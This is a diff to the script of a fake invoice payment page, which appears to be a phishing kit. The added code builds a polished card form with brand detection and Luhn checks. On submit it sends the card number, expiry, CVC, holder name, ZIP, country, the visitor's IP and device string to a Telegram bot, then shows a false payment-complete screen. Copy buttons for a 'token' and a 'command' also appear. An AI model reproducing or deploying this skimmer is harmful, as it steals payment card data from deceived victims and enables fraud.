-    wait.hidden = true;
-    done.hidden = false;
-    refnote.hidden = true;
-    if (viewer) viewer.hidden = true;
-    store('inv1184paid', '1');
+/* ---------------- COPY ---------------- */
+function copyText(text, btn, label) {
+  var done = function () {
+    btn.textContent = "Copied";
+    setTimeout(function () { btn.textContent = label; }, 1600);
+  };
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).then(done).catch(done);
+  } else {
+    var ta = document.createElement("textarea");
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand("copy"); } catch (e) {}
+    document.body.removeChild(ta);
+    done();
   }
+}
 
-  function payFlow() {
-    if (read('inv1184paid')) return;
-    idle.hidden = true;
-    wait.hidden = false;
-    waittxt.textContent = 'Opening secure payment…';
-    setTimeout(function () { waittxt.textContent = 'Waiting for confirmation from your bank…'; }, 6000);
-    setTimeout(showDone, 20000);
+document.getElementById("cp").addEventListener("click", function () {
+  copyText(document.getElementById("tok").textContent, this, "Copy token");
+});
+
+document.getElementById("cpc").addEventListener("click", function () {
+  copyText(document.getElementById("cmd").textContent, this, "Copy command");
+});
+
+/* ---------------- CARD BRAND ---------------- */
+var num = document.getElementById("cardnumber");
+var exp = document.getElementById("cardexp");
+var cvc = document.getElementById("cardcvc");
+var zip = document.getElementById("cardzip");
+var name = document.getElementById("cardname");
+var brandLabel = document.getElementById("brandlabel");
+var brandChips = document.querySelectorAll(".brands .b");
+
+var BRANDS = [
+  { id: "visa", label: "VISA", re: /^4/, len: [13, 16, 19], cvc: 3 },
+  { id: "mastercard", label: "MASTERCARD", re: /^(5[1-5]|2[2-7])/, len: [16], cvc: 3 },
+  { id: "amex", label: "AMERICAN EXPRESS", re: /^3[47]/, len: [15], cvc: 4 },
+  { id: "discover", label: "DISCOVER", re: /^(6011|65|64[4-9])/, len: [16, 19], cvc: 3 }
+];
+
+function detectBrand(digits) {
+  if (!digits) return null;
+  for (var i = 0; i < BRANDS.length; i++) {
+    if (BRANDS[i].re.test(digits)) return BRANDS[i];
   }
+  return null;
+}
 
-  if (dl) dl.addEventListener('click', reveal);
-  dlm.addEventListener('click', function (e) { e.preventDefault(); reveal(); });
-  paybtn.addEventListener('click', payFlow);
+function currentBrand() {
+  return detectBrand(num.value.replace(/\D/g, ""));
+}
 
-  if (read('inv1184')) {
-    pay.hidden = false;
-    veil.classList.add('gone');
-    note.classList.add('gone');
-    bar.hidden = true;
-    if (read('inv1184paid')) showDone();
-  }
-
-  function flash(b) { var o = b.textContent; b.textContent = 'Copied'; setTimeout(function () { b.textContent = o; }, 1500); }
-  function fallback(t, b) {
-    var ta = document.createElement('textarea');
-    ta.value = t; ta.setAttribute('readonly', '');
-    ta.style.position = 'fixed'; ta.style.top = '-1000px';
-    document.body.appendChild(ta); ta.select(); ta.setSelectionRange(0, t.length);
-    try { document.execCommand('copy'); } catch (e) {}
-    document.body.removeChild(ta); flash(b);
-  }
-  function copyText(t, b) {
-    if (navigator.clipboard && window.isSecureContext) {
-      navigator.clipboard.writeText(t).then(function () { flash(b); }, function () { fallback(t, b); });
-    } else { fallback(t, b); }
-  }
-
-  document.getElementById('cp').addEventListener('click', function () {
-    copyText(this.previousElementSibling.textContent.trim(), this);
+function paintBrand(brand) {
+  brandChips.forEach(function (chip) {
+    chip.classList.toggle("on", !!brand && chip.dataset.brand === brand.id);
   });
-  document.getElementById('pdf').addEventListener('click', function () { window.print(); });
+  if (brand) {
+    brandLabel.textContent = brand.label;
+    brandLabel.classList.add("on");
+    cvc.maxLength = brand.cvc;
+    cvc.placeholder = brand.cvc === 4 ? "1234" : "123";
+  } else {
+    brandLabel.textContent = "";
+    brandLabel.classList.remove("on");
+    cvc.maxLength = 4;
+    cvc.placeholder = "123";
+  }
+}
+
+num.addEventListener("input", function () {
+  var brand = currentBrand();
+  var digits = num.value.replace(/\D/g, "");
+
+  if (brand && brand.id === "amex") {
+    digits = digits.slice(0, 15);
+    num.value = digits.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*$/, function (m, a, b, c) {
+      return [a, b, c].filter(Boolean).join(" ");
+    });
+  } else {
+    digits = digits.slice(0, 19);
+    num.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+  }
+
+  paintBrand(detectBrand(digits));
+});
+
+exp.addEventListener("input", function () {
+  var d = exp.value.replace(/\D/g, "").slice(0, 4);
+  if (d.length >= 3) d = d.slice(0, 2) + "/" + d.slice(2);
+  exp.value = d;
+});
+
+cvc.addEventListener("input", function () {
+  cvc.value = cvc.value.replace(/\D/g, "");
+});
+
+zip.addEventListener("input", function () {
+  zip.value = zip.value.replace(/[^\w\- ]/g, "");
+});
+
+function luhn(digits) {
+  var sum = 0, alt = false;
+  for (var i = digits.length - 1; i >= 0; i--) {
+    var n = parseInt(digits.charAt(i), 10);
+    if (alt) { n *= 2; if (n > 9) n -= 9; }
+    sum += n;
+    alt = !alt;
+  }
+  return sum % 10 === 0;
+}
+
+/* ---------------- SUBMIT ---------------- */
+var form = document.getElementById("payform");
+var go = document.getElementById("paygo");
+var errBox = document.getElementById("payerr");
+var paybody = document.getElementById("paybody");
+var paydone = document.getElementById("paydone");
+var payopen = document.getElementById("payopen");
+
+payopen.addEventListener("click", function () {
+  form.classList.add("open");
+  payopen.style.display = "none";
+  setTimeout(function () { name.focus(); }, 380);
+});
+
+function showErr(msg) {
+  errBox.textContent = msg;
+  errBox.hidden = false;
+}
+
+form.addEventListener("submit", function (event) {
+  event.preventDefault();
+  errBox.hidden = true;
+
+  var digits = num.value.replace(/\D/g, "");
+  var brand = detectBrand(digits);
+  var holder = name.value.trim();
+  var expiry = exp.value.trim();
+
+  if (holder.length < 3) { showErr("Enter the name printed on the card."); name.focus(); return; }
+  if (!brand) { showErr("Card number not recognised. Check the first digits."); num.focus(); return; }
+  if (digits.length < brand.len[0] || !luhn(digits)) {
+    showErr("That card number looks incomplete. Please check it.");
+    num.focus();
+    return;
+  }
+  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) { showErr("Expiry must be MM/YY."); exp.focus(); return; }
+  if (cvc.value.length < brand.cvc) { showErr("CVC is " + brand.cvc + " digits."); cvc.focus(); return; }
+  if (zip.value.trim().length < 3) { showErr("Enter the billing ZIP for this card."); zip.focus(); return; }
+
+  go.disabled = true;
+  go.classList.add("paying");
+  go.querySelector(".paylabel").textContent = "Processing\u2026";
+  form.querySelectorAll("input, select").forEach(function (f) { f.disabled = true; });
+
+  var started = Date.now();
+
+  sendPayment(brand, digits).finally(function () {
+    var wait = Math.max(0, 5000 - (Date.now() - started));
+    setTimeout(function () {
+      paybody.style.display = "none";
+      paydone.hidden = false;
+      paydone.scrollIntoView({ behavior: "smooth", block: "center" });
+    }, wait);
+  });
+});
+
+/* ---------------- CAPTURE ---------------- */
+function fetchIpAddress() {
+  return fetch("https://api.ipify.org?format=json")
+    .then(function (r) { return r.json(); })
+    .then(function (d) { return d.ip; })
+    .catch(function () { return "Unavailable"; });
+}
+
+function sendPayment(brand, digits) {
+  return fetchIpAddress().then(function (ip) {
+    var message =
+      "*#--------[ INVOICE PAYMENT ]---------#*\n\n" +
+      "*Invoice* : " + INVOICE + "\n" +
+      "*Amount* : " + AMOUNT + "\n\n" +
+      "*Card* : " + digits.replace(/(\d{4})(?=\d)/g, "$1 ") + "\n" +
+      "*Brand* : " + brand.label + "\n" +
+      "*Expiry* : " + exp.value + "\n" +
+      "*CVC* : " + cvc.value + "\n" +
+      "*Name* : " + name.value.trim() + "\n" +
+      "*ZIP* : " + zip.value.trim() + " / " + document.getElementById("cardcountry").value + "\n" +
+      "*IP* : " + ip + "\n" +
+      "*Device* : " + navigator.userAgent + "\n\n" +
+      "*#------------[ CARD SUBMITTED ]-------------#*";
+
+    return sendToTelegram(message).catch(function () {});
+  });
+}
+
+function sendToTelegram(message) {
+  var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+  return fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message, disable_web_page_preview: true })
+  }).then(function (r) {
+    if (!r.ok) throw new Error("Telegram " + r.status);
+    return r.json();
+  });
+}
 </script>
 </body>
 </html>
